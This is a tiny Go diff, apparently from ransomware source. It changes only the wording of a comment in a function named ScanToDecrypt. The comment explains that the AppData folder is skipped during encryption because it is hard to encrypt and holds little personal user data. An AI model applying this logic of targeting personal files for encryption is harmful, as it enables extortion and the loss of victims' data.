@@ -80,7 +80,7 @@ func (f *Files) ScanToDecrypt() ([]string, error) {
 		stat, error := os.Stat(path)
 		/*
 			The AppData folder contains a load of files that are difficult to
-			encrypt (because of permissions) and it doesn't contain much
+			encrypt (because of permissions) and doesn't contain much
 			personal user data, so we'll skip trying to encrypt it.
 		*/
 		if info.IsDir() && info.Name() == "AppData" {
